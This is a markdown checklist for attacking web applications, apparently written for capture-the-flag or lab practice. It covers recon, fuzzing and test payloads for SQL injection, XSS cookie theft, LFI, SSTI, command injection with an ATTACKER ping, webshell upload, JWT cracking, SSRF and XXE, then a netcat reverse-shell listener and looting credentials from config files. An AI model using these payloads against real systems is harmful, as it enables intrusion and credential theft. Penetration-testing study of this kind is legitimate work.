# Web Enumeration & Attack Checklist

For attacking a web app/challenge. Recon first, then test vulnerabilities roughly
in order of likelihood/ease. Put Burp in the middle of everything (proxy the browser).

> Set a target var to reuse: `URL=http://target:port` and proxy through Burp.

---

## 1. Initial recon

- [ ] Fingerprint the stack (server, framework, CMS, languages)
  ```bash
  whatweb -a 3 $URL
  curl -sI $URL                 # response headers (Server, X-Powered-By, Set-Cookie)
  ```
- [ ] **View page source** + comments (devs leave creds, hints, hidden endpoints)
  ```bash
  curl -s $URL | less           # look for <!-- comments -->, TODO, debug
  ```
- [ ] robots.txt, sitemap, security.txt (free list of paths)
  ```bash
  curl -s $URL/robots.txt; curl -s $URL/sitemap.xml; curl -s $URL/.well-known/security.txt
  ```
- [ ] Inspect cookies (flags? base64/JWT? session predictability?) and headers
      (missing security headers, interesting custom headers).
- [ ] Pull & read **JavaScript files** — endpoints, API routes, keys, hidden params
  ```bash
  curl -s $URL | grep -oE 'src="[^"]+\.js"'      # then fetch each .js and grep
  # look for: fetch(, axios, /api/, apiKey, token, secret
  ```
- [ ] Check common interesting paths
  ```
  /admin /login /dashboard /api /backup /.git /.env /phpinfo.php /server-status
  ```
- [ ] Exposed `.git`? Dump it
  ```bash
  git-dumper $URL/.git/ ./loot_git
  ```

## 2. Content & vhost discovery (fuzzing)

- [ ] Directory & file brute force
  ```bash
  ffuf -u $URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -ac
  feroxbuster -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
  gobuster dir -u $URL -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,html,bak
  ```
- [ ] Look for extensions matching the stack (`-x php` PHP, `-x aspx` IIS, `-x jsp` Java).
- [ ] Virtual host / subdomain fuzzing (when a hostname is in scope)
  ```bash
  ffuf -u $URL -H "Host: FUZZ.target.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -ac
  ```
- [ ] Parameter fuzzing on a found endpoint
  ```bash
  ffuf -u "$URL/page.php?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -ac
  ```

## 3. Vulnerabilities to test (in order)

- [ ] **Default / weak credentials** — try admin:admin, admin:password, product defaults;
      then `hydra` the login form. Check docs for the detected CMS/app default creds.
  ```bash
  hydra -L users.txt -P /usr/share/wordlists/rockyou.txt $TARGET http-post-form \
    "/login:user=^USER^&pass=^PASS^:Invalid"
  ```
- [ ] **SQL injection** — test `'`, `' OR 1=1-- -`, time-based, in params/headers/cookies.
  ```bash
  sqlmap -u "$URL/item.php?id=1" --batch --dbs        # then --tables --dump
  # for auth: sqlmap -r request.txt --batch  (save the request from Burp)
  ```
- [ ] **XSS** — reflected/stored/DOM. Test `<script>alert(1)</script>`, `"><img src=x onerror=alert(1)>`.
      Useful for stealing admin cookies/CSRF. (XSStrike, or manual via Burp.)
- [ ] **LFI / path traversal** — `?file=../../../../etc/passwd`, php wrappers
      (`php://filter/convert.base64-encode/resource=index.php`), log poisoning → RCE.
  ```bash
  ffuf -u "$URL/?page=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
  ```
- [ ] **SSTI** — inputs reflected in templates. Probe `${7*7}`, `{{7*7}}`, `<%=7*7%>`;
      if `49` appears → identify engine (Jinja2/Twig/etc) and escalate to RCE.
- [ ] **Command injection** — params that hit the OS. Try `; id`, `| id`, `$(id)`, `` `id` ``,
      `& ping -c1 ATTACKER` (blind → use OOB/Burp Collaborator or time delay).
- [ ] **IDOR / broken access control** — change `id=`/`user=` to another value; access
      admin-only pages directly; tamper with roles in cookies/JWT.
- [ ] **File upload** — bypass filters (double ext `.php.jpg`, magic bytes, content-type,
      `.phtml`/`.php5`), upload a webshell, find where it lands, then RCE.
- [ ] **Auth / JWT** — weak/none alg (`alg:none`), crack HS256 secret, tamper claims.
  ```bash
  hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt    # crack JWT secret
  # then forge with jwt_tool or python jwt
  ```
- [ ] **SSRF** — params taking a URL → hit internal services (`http://127.0.0.1`,
      `http://169.254.169.254/` cloud metadata). Pivot to internal apps.
- [ ] **XXE** — XML input → external entities to read files
      (`<!ENTITY xxe SYSTEM "file:///etc/passwd">`) or SSRF/OOB exfil.

## 4. After you get a foothold (webshell / RCE)

- [ ] Upgrade to a reverse shell, then upgrade the TTY.
  ```bash
  rlwrap nc -lvnp 4444        # listener; then trigger reverse shell from the app
  ```
- [ ] Loot web config files for DB/app creds: `config.php`, `wp-config.php`, `.env`,
      `settings.py`, `appsettings.json`.
- [ ] Move to the appropriate privesc checklist (Linux or Windows).

---

## Quick reference: tools per step
- Fingerprint: `whatweb`, `curl -I`, Wappalyzer
- Discovery: `ffuf`, `feroxbuster`, `gobuster`, `git-dumper`
- Proxy/manual: **Burp Suite** (Repeater, Intruder, Collaborator)
- SQLi: `sqlmap`  ·  XSS: `XSStrike`/manual  ·  JWT: `jwt_tool`/`hashcat`
- Brute force: `hydra`, `wfuzz`/`ffuf`
- Payload refs (keep OFFLINE): PayloadsAllTheThings, HackTricks web section
